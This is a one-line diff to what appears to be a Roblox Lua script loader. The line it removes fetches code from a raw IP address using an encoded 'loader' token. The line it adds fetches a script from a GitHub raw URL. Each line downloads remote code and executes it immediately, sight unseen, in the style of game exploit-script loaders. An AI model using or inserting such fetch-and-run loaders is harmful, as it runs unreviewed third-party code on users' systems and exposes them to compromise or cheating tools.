@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImZmZWM2ZjMwLTA1NTktNGRhMS05ODNiLTY5YmZmYTU5ZGY1MCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RE-Bloxified/amstlr/refs/heads/main/am.lua"))();
